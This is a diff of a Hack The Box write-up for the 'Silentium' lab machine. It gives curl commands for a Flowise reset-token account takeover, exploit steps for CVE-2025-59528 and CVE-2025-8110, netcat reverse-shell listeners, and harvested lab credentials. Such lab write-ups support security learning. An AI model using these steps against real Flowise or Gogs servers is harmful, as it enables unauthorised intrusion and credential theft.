@@ -1,58 +1,64 @@
-# Hack The Box — Silentium
+<div align="center">
 
-![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
-![Platform](https://img.shields.io/badge/Platform-Linux-blue)
-![Status](https://img.shields.io/badge/Status-Rooted-success)
-![CVE-2025-59528](https://img.shields.io/badge/CVE--2025--59528-Critical-red)
-![CVE-2025-8110](https://img.shields.io/badge/CVE--2025--8110-Critical-red)
+# Silentium — HackTheBox
+
+![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
+![OS](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge)
+![Status](https://img.shields.io/badge/Status-Rooted-success?style=for-the-badge)
+
+<img src="../assets/MrsNobody.png" width="200" alt="MrsNobody">
+
+**MrsNobody**
+
+[![HTB](https://img.shields.io/badge/HackTheBox-Profile-green?style=flat&logo=hackthebox)](https://app.hackthebox.com)
 
 ---
 
-## Disclaimer
+</div>
 
-This writeup is for **educational use only** and was performed in an authorized Hack The Box environment.
+> **Disclaimer:** This writeup is for educational purposes only, performed in an authorized Hack The Box environment.
 
----
+## Target Information
 
-## Target Info
-
-| Field | Value |
-|-------|-------|
+| Property | Value |
+|----------|-------|
 | Machine | Silentium |
-| IP | 10.129.x.x |
-| Domain | silentium.htb |
+| IP | `<TARGET_IP>` |
+| OS | Linux |
 | Difficulty | Easy |
-| OS | Linux (Ubuntu) |
-| Services | SSH (22), HTTP/nginx (80) |
+| Hostname | silentium.htb |
 | Key CVEs | CVE-2025-59528, CVE-2025-8110 |
-
----
 
 ## Table of Contents
 
-1. [Port Scanning](#-port-scanning)
-2. [Host Mapping & Subdomain Discovery](#-host-mapping--subdomain-discovery)
-3. [Flowise Platform Enumeration](#-flowise-platform-enumeration)
-4. [Password Reset Token Disclosure](#-password-reset-token-disclosure)
-5. [CVE-2025-59528 — Flowise CustomMCP RCE](#-cve-2025-59528--flowise-custommcp-rce)
-6. [Container Escape — Credential Harvesting](#-container-escape--credential-harvesting)
-7. [SSH as ben — User Flag](#-ssh-as-ben--user-flag)
-8. [Internal Gogs Enumeration](#-internal-gogs-enumeration)
-9. [CVE-2025-8110 — Gogs Symlink RCE](#-cve-2025-8110--gogs-symlink-rce)
-10. [Root Flag](#-root-flag)
-11. [Attack Chain Summary](#-attack-chain-summary)
+1. [Port Scanning](#port-scanning)
+2. [Host Mapping and Subdomain Discovery](#host-mapping-and-subdomain-discovery)
+3. [Flowise Platform Enumeration](#flowise-platform-enumeration)
+4. [Password Reset Token Disclosure](#password-reset-token-disclosure)
+5. [CVE-2025-59528 - Flowise CustomMCP RCE](#cve-2025-59528---flowise-custommcp-rce)
+6. [Container Escape - Credential Harvesting](#container-escape---credential-harvesting)
+7. [SSH as ben - User Flag](#ssh-as-ben---user-flag)
+8. [Internal Gogs Enumeration](#internal-gogs-enumeration)
+9. [CVE-2025-8110 - Gogs Symlink RCE](#cve-2025-8110---gogs-symlink-rce)
+10. [Root Flag](#root-flag)
+11. [Attack Chain Summary](#attack-chain-summary)
+12. [Credentials Collected](#credentials-collected)
+13. [CVE References](#cve-references)
+14. [Key Takeaways](#key-takeaways)
+15. [Tools Used](#tools-used)
+16. [Flags](#flags)
 
 ---
 
-# Port Scanning
+## Port Scanning
 
-## Full Port Scan
+### Full Port Scan
 
 ```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <TARGET_IP>
 ```
 
-## Service Version Scan
+### Service Version Scan
 
 ```bash
 nmap -sCV -p22,80 -Pn <TARGET_IP>
@@ -77,25 +83,25 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ### Key Takeaways
 
-- **Port 22** — OpenSSH 9.6p1 (Ubuntu)
-- **Port 80** — nginx 1.24.0, redirects to `http://silentium.htb/`
-- Only 2 ports open — web is the primary attack surface
+- **Port 22** - OpenSSH 9.6p1 (Ubuntu)
+- **Port 80** - nginx 1.24.0, redirects to `http://silentium.htb/`
+- Only 2 ports open - web is the primary attack surface
 
 ---
 
-# Host Mapping & Subdomain Discovery
+## Host Mapping and Subdomain Discovery
 
-## Add Hostname
+### Add Hostname
 
 ```bash
 echo "<TARGET_IP>   silentium.htb" | sudo tee -a /etc/hosts
 ```
 
-## Website Recon
+### Website Recon
 
 Visiting `http://silentium.htb/` shows an institutional finance landing page for "Silentium" with a loan calculator, leadership team, and static content. Nothing exploitable on the main domain.
 
-## Virtual Host Discovery
+### Virtual Host Discovery
 
 ```bash
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
@@ -106,7 +112,7 @@ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
 
 **Result:** `staging.silentium.htb` discovered (HTTP 200, Size: 3142)
 
-## Update /etc/hosts
+### Update /etc/hosts
 
 ```bash
 sudo sed -i 's/silentium.htb/silentium.htb staging.silentium.htb/' /etc/hosts
@@ -114,11 +120,11 @@ sudo sed -i 's/silentium.htb/silentium.htb staging.silentium.htb/' /etc/hosts
 
 ---
 
-# Flowise Platform Enumeration
+## Flowise Platform Enumeration
 
-Navigating to `http://staging.silentium.htb` reveals a **Flowise AI** platform — an open-source low-code tool for building LLM-based workflows and AI agents.
+Navigating to `http://staging.silentium.htb` reveals a **Flowise AI** platform - an open-source low-code tool for building LLM-based workflows and AI agents.
 
-## Version Detection
+### Version Detection
 
 ```bash
 curl -s http://staging.silentium.htb/api/v1/version
@@ -128,7 +134,7 @@ curl -s http://staging.silentium.htb/api/v1/version
 {"version":"3.0.5"}
 ```
 
-## API Endpoint Enumeration
+### API Endpoint Enumeration
 
 ```bash
 curl -s http://staging.silentium.htb/api/v1/ping
@@ -138,7 +144,7 @@ curl -s http://staging.silentium.htb/api/v1/ping
 pong
 ```
 
-Most API endpoints return `{"error":"Unauthorized Access"}` — authentication is required.
+Most API endpoints return `{"error":"Unauthorized Access"}` - authentication is required.
 
 ### Unauthenticated Endpoints
 
@@ -153,15 +159,15 @@ Most API endpoints return `{"error":"Unauthorized Access"}` — authentication i
 
 ---
 
-# Password Reset Token Disclosure
+## Password Reset Token Disclosure
 
-## Identifying User Emails
+### Identifying User Emails
 
 From the main website's **Leadership** section, the team member **Ben** is listed as "Head of Financial Systems." His email follows the pattern: `ben@silentium.htb`.
 
-## Exploiting the Forgot Password Endpoint
+### Exploiting the Forgot Password Endpoint
 
-The Flowise `forgot-password` endpoint, when called with the `x-request-from: internal` header, returns the **full user object** in the response body — including the password reset token. This is a critical information disclosure vulnerability.
+The Flowise `forgot-password` endpoint, when called with the `x-request-from: internal` header, returns the **full user object** in the response body - including the password reset token. This is a critical information disclosure vulnerability.
 
 ```bash
 curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
@@ -198,11 +204,11 @@ curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
 | Bcrypt Hash | `$2a$05$hse1NxgAweCjP9qCKq3U3ua.DfJNVl4JxccdL/srboQvZ4CG2l6ma` |
 | Reset Token | Returned in `tempToken` field |
 
-## Resetting the Password
+### Resetting the Password
 
 Use the disclosed `tempToken` to verify the account, then reset the password:
 
-### Step 1 — Verify Token
+#### Step 1 - Verify Token
 
 ```bash
 TOKEN="<PASTE_TOKEN_FROM_RESPONSE>"
@@ -213,7 +219,7 @@ curl -s -X POST http://staging.silentium.htb/api/v1/account/verify \
   -d "{\"user\": {\"tempToken\": \"$TOKEN\"}}"
 ```
 
-### Step 2 — Reset Password
+#### Step 2 - Reset Password
 
 ```bash
 curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
@@ -224,7 +230,7 @@ curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
 
 > **Note:** The reset-password endpoint may return a 500 error due to a database transaction bug, but the password is still updated. Alternatively, re-request the token and verify again. The exact flow may vary by instance.
 
-### Step 3 — Login
+#### Step 3 - Login
 
 ```bash
 curl -s -X POST http://staging.silentium.htb/api/v1/account/login \
@@ -233,11 +239,11 @@ curl -s -X POST http://staging.silentium.htb/api/v1/account/login \
   -d '{"username": "ben@silentium.htb", "password": "YourNewPassword123!"}'
 ```
 
-This returns a **JWT token** — use it as `Authorization: Bearer <JWT>` for all subsequent API calls.
+This returns a **JWT token** - use it as `Authorization: Bearer <JWT>` for all subsequent API calls.
 
 ---
 
-# CVE-2025-59528 — Flowise CustomMCP RCE
+## CVE-2025-59528 - Flowise CustomMCP RCE
 
 | Detail | Value |
 |--------|-------|
@@ -247,19 +253,19 @@ This returns a **JWT token** — use it as `Authorization: Bearer <JWT>` for all
 | Type | Remote Code Execution |
 | Root Cause | `Function()` constructor injection via `mcpServerConfig` |
 
-## Vulnerability Details
+### Vulnerability Details
 
-The Flowise **CustomMCP** node processes user-supplied configuration via the `mcpServerConfig` parameter. Internally, the `convertToValidJSONString` function passes this input directly to JavaScript's `Function()` constructor — equivalent to `eval()` — without any validation or sanitization.
+The Flowise **CustomMCP** node processes user-supplied configuration via the `mcpServerConfig` parameter. Internally, the `convertToValidJSONString` function passes this input directly to JavaScript's `Function()` constructor - equivalent to `eval()` - without any validation or sanitization.
 
 Since Flowise runs under **Node.js with full runtime privileges**, injected code has access to dangerous modules such as `child_process` and `fs`.
 
-## Start Listener
+### Start Listener
 
 ```bash
 rlwrap nc -lnvp 4444
 ```
 
-## Fire the Exploit
+### Fire the Exploit
 
 **Endpoint:** `POST /api/v1/node-load-method/customMCP`
 
@@ -289,15 +295,15 @@ uid=0(root) gid=0(root) groups=0(root)
 <container_id>
 ```
 
-> **Note:** You land as **root inside a Docker container** — not the host.
+> **Note:** You land as **root inside a Docker container** - not the host.
 
 ---
 
-# Container Escape — Credential Harvesting
+## Container Escape - Credential Harvesting
 
 Standard Docker escape techniques (privileged mode, Docker socket) are not available. Focus on **environment variables** and **local files**.
 
-## Environment Variable Dump
+### Environment Variable Dump
 
 ```bash
 env
@@ -313,7 +319,7 @@ env
 | `SMTP_HOST` | `mailhog` |
 | `JWT_AUTH_TOKEN_SECRET` | `AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD` |
 
-## Flowise Database & Encryption Key
+### Flowise Database and Encryption Key
 
 ```bash
 sqlite3 ~/.flowise/database.sqlite "SELECT name, passwd, salt FROM user;"
@@ -333,7 +339,7 @@ hdsVqdkOcLN4fwdpvMPtbAi2++qi8yFc
 
 ---
 
-# SSH as ben — User Flag
+## SSH as ben - User Flag
 
 The `SMTP_PASSWORD` (`r04D!!_R4ge`) is **reused** as ben's SSH password on the host.
 
@@ -352,9 +358,9 @@ af682b00e02e1e4c████████████████
 
 ---
 
-# Internal Gogs Enumeration
+## Internal Gogs Enumeration
 
-## Port Discovery
+### Port Discovery
 
 ```bash
 ss -tlnp
@@ -367,7 +373,7 @@ ss -tlnp
 127.0.0.1:1025  — Mailhog SMTP
 ```
 
-## Gogs Configuration
+### Gogs Configuration
 
 ```bash
 cat /opt/gogs/gogs/custom/conf/app.ini
@@ -384,9 +390,9 @@ cat /opt/gogs/gogs/custom/conf/app.ini
 | `DISABLE_REGISTRATION` | `false` |
 | `ENABLE_REGISTRATION_CAPTCHA` | `true` |
 
-> **Critical:** Gogs is running as **root** — any RCE = full system compromise.
+> **Critical:** Gogs is running as **root** - any RCE = full system compromise.
 
-## SSH Tunnel
+### SSH Tunnel
 
 ```bash
 ssh -N -f -L 3001:127.0.0.1:3001 ben@<TARGET_IP>
@@ -394,7 +400,7 @@ ssh -N -f -L 3001:127.0.0.1:3001 ben@<TARGET_IP>
 
 > **Important:** The Gogs API requires the correct `Host` header to function. Use `staging-v2-code.dev.silentium.htb` when making API calls.
 
-## Gogs API Verification
+### Gogs API Verification
 
 ```bash
 curl -s -H "Host: staging-v2-code.dev.silentium.htb" \
@@ -405,11 +411,11 @@ curl -s -H "Host: staging-v2-code.dev.silentium.htb" \
 {"data":[],"ok":true}
 ```
 
-## Registering a User
+### Registering a User
 
 Registration has a **captcha** requirement. Download the captcha, solve it visually, and submit:
 
-### Step 1 — Get CSRF Token & Captcha
+#### Step 1 - Get CSRF Token and Captcha
 
 ```bash
 # Get the signup page (save cookies)
@@ -426,7 +432,7 @@ curl -s -b /tmp/cookies.txt \
   "http://127.0.0.1:3001/captcha/${CAPTCHA_ID}.png" -o /tmp/captcha.png
 ```
 
-### Step 2 — Submit Registration
+#### Step 2 - Submit Registration
 
 ```bash
 CAPTCHA_ANSWER="<SOLVED_CAPTCHA>"
@@ -443,7 +449,7 @@ curl -s -X POST http://127.0.0.1:3001/user/sign_up \
   --data-urlencode "captcha=$CAPTCHA_ANSWER"
 ```
 
-### Step 3 — Create API Token
+#### Step 3 - Create API Token
 
 ```bash
 curl -s -X POST \
@@ -460,17 +466,17 @@ curl -s -X POST \
 
 ---
 
-# CVE-2025-8110 — Gogs Symlink RCE
+## CVE-2025-8110 - Gogs Symlink RCE
 
 | Detail | Value |
 |--------|-------|
 | CVE | CVE-2025-8110 |
 | Component | Gogs Git Service |
-| Type | Symlink-based `.git/config` Overwrite → RCE |
+| Type | Symlink-based `.git/config` Overwrite leading to RCE |
 | Root Cause | Gogs follows symlinks when updating file content via API |
 | Impact | Arbitrary command execution as the Gogs service user |
 
-## Vulnerability Details
+### Vulnerability Details
 
 This vulnerability exploits Gogs' handling of repositories containing **symlinks**:
 
@@ -479,7 +485,7 @@ This vulnerability exploits Gogs' handling of repositories containing **symlinks
 3. The `core.sshCommand` directive in `.git/config` is **executed** when any Git SSH operation is triggered
 4. Result: **arbitrary command execution** as the Gogs service user (in this case, **root**)
 
-## Exploit Script
+### Exploit Script
 
 Save this as `CVE-2025-8110.py`:
 
@@ -575,13 +581,13 @@ if __name__ == "__main__":
     main()
 ```
 
-## Start Listener
+### Start Listener
 
 ```bash
 rlwrap nc -lnvp 9001
 ```
 
-## Run the Exploit
+### Run the Exploit
 
 ```bash
 python3 CVE-2025-8110.py \
@@ -610,7 +616,7 @@ root@silentium:/opt/gogs/gogs/data/tmp/local-repo/1#
 
 ---
 
-# Root Flag
+## Root Flag
 
 ```bash
 root@silentium:~# cat /root/root.txt
@@ -619,42 +625,42 @@ root@silentium:~# cat /root/root.txt
 
 ---
 
-# Attack Chain Summary
+## Attack Chain Summary
 
 ```
 Port 80 (nginx)
- └── silentium.htb — Static financial landing page
-      └── VHOST: staging.silentium.htb (Flowise 3.0.5)
-           └── Password reset token disclosure (x-request-from: internal)
-                └── Account takeover → ben@silentium.htb
-                     └── CVE-2025-59528 — Flowise CustomMCP JS Injection
-                          └── RCE inside Docker container (root)
-                               └── Environment variable credential leak
-                                    ├── FLOWISE_PASSWORD: F1l3_d0ck3r
-                                    └── SMTP_PASSWORD: r04D!!_R4ge
-                                         └── SSH as ben (password reuse) → user.txt
-                                              └── Internal Gogs on :3001 (running as root)
-                                                   └── CVE-2025-8110 — Symlink .git/config injection
-                                                        └── RCE as root → root.txt
+ +-- silentium.htb -- Static financial landing page
+      +-- VHOST: staging.silentium.htb (Flowise 3.0.5)
+           +-- Password reset token disclosure (x-request-from: internal)
+                +-- Account takeover -> ben@silentium.htb
+                     +-- CVE-2025-59528 -- Flowise CustomMCP JS Injection
+                          +-- RCE inside Docker container (root)
+                               +-- Environment variable credential leak
+                                    |-- FLOWISE_PASSWORD: F1l3_d0ck3r
+                                    +-- SMTP_PASSWORD: r04D!!_R4ge
+                                         +-- SSH as ben (password reuse) -> user.txt
+                                              +-- Internal Gogs on :3001 (running as root)
+                                                   +-- CVE-2025-8110 -- Symlink .git/config injection
+                                                        +-- RCE as root -> root.txt
 ```
 
 ---
 
-# Credentials Collected
+## Credentials Collected
 
 | Source | Username | Password / Hash |
 |--------|----------|-----------------|
 | Flowise Token Disclosure | ben@silentium.htb | `$2a$05$hse1NxgAweCjP9qCKq3U3ua.DfJNVl4JxccdL/srboQvZ4CG2l6ma` |
-| Docker ENV — Flowise | ben | `F1l3_d0ck3r` |
-| Docker ENV — SMTP | — | `r04D!!_R4ge` |
-| Docker ENV — JWT Secret | — | `AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD` |
-| Flowise DB Encryption Key | — | `hdsVqdkOcLN4fwdpvMPtbAi2++qi8yFc` |
+| Docker ENV - Flowise | ben | `F1l3_d0ck3r` |
+| Docker ENV - SMTP | - | `r04D!!_R4ge` |
+| Docker ENV - JWT Secret | - | `AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD` |
+| Flowise DB Encryption Key | - | `hdsVqdkOcLN4fwdpvMPtbAi2++qi8yFc` |
 | Gogs Config | SECRET_KEY | `sdsrcxSm0iC7wDO` |
 | SSH (password reuse) | ben | `r04D!!_R4ge` |
 
 ---
 
-# CVE References
+## CVE References
 
 | CVE | Component | CVSS | Description |
 |-----|-----------|------|-------------|
@@ -663,18 +669,18 @@ Port 80 (nginx)
 
 ---
 
-# Key Takeaways
+## Key Takeaways
 
-- **API endpoints that return password reset tokens** in response bodies are a critical information disclosure risk — they bypass the entire purpose of the reset flow
-- The `x-request-from: internal` header can bypass authentication middleware in Flowise — always check for header-based auth bypass
+- **API endpoints that return password reset tokens** in response bodies are a critical information disclosure risk - they bypass the entire purpose of the reset flow
+- The `x-request-from: internal` header can bypass authentication middleware in Flowise - always check for header-based auth bypass
 - **Container environment variables** frequently hold plaintext credentials that are reused on the host system
 - Internal services running as **privileged users (root)** amplify the impact of any RCE vulnerability found during lateral movement
-- Gogs API endpoints may require a specific **Host header** matching the configured domain — enumerate `app.ini` for the correct value
+- Gogs API endpoints may require a specific **Host header** matching the configured domain - enumerate `app.ini` for the correct value
 - When registration captchas block automated account creation, try the **API-based registration** which may bypass the captcha requirement
 
 ---
 
-# Tools Used
+## Tools Used
 
 | Tool | Purpose |
 |------|---------|
@@ -688,10 +694,21 @@ Port 80 (nginx)
 
 ---
 
-<!-- HTB Silentium Search Keywords -->
-<!-- silentium hackthebox, silentium htb, silentium htb writeup, silentium htb walkthrough -->
-<!-- flowise rce, flowise exploit, flowise cve, CVE-2025-59528, flowise custommcp rce -->
-<!-- gogs rce, gogs exploit, gogs symlink, CVE-2025-8110, gogs git config injection -->
-<!-- flowise password reset token disclosure, flowise x-request-from internal -->
-<!-- flowise 3.0.5 exploit, gogs symlink sshcommand, docker credential harvesting -->
-<!-- htb easy linux, hackthebox easy machine, htb ai platform exploit -->
+## Flags
+
+| Flag | Value |
+|------|-------|
+| User | `af682b00e02e1e4c████████████████` |
+| Root | `7b7fab8c83b9bdb4████████████████` |
+
+---
+
+<div align="center">
+
+**Written by MrsNobody**
+
+<img src="../assets/MrsNobody.png" width="80">
+
+*Hack The Box — Silentium*
+
+</div>
